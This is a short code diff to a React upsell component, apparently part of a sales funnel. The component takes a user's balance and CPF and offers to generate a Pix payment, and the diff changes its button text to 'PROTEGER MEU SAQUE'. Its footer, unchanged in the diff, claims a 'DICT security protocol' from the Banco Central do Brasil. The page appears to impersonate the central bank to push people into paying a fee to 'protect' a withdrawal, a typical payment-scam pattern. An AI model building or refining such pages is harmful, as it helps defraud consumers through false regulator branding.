@@ -40,7 +40,7 @@ const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, 
         <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo de segurança DICT • Banco Central do Brasil</p>
         <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo de segurança DICT • Banco Central do Brasil</p>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={firstName ? `${firstName.toUpperCase()}, PROTEGER MEU SAQUE` : "PROTEGER MEU SAQUE DE " + balance} bgColor="bg-emerald-500" shadowColor="shadow-emerald-500/30" />
+      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="PROTEGER MEU SAQUE" bgColor="bg-emerald-500" shadowColor="shadow-emerald-500/30" />
     </div>
   );
 };
